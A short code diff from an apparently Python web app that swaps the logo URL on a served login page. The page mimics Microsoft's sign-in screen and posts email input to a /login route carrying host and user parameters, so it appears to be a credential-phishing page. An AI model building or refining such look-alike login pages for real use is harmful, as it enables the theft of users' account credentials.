@@ -63,7 +63,7 @@ def show_login():
 <body>
     <div class="main">
         <div class="login-box">
-            <img class="logo" src="https://www.pngfind.com/pngs/m/311-3118532_microsoft-logo-microsoft-logo-high-res-hd-png.png" alt="Microsoft logo" width="80" />
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" alt="Microsoft logo" width="80" />
             <h1>Sign in to your account</h1>
             <form method="POST" action="/login?host={host}&user={user}">
                 <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus />
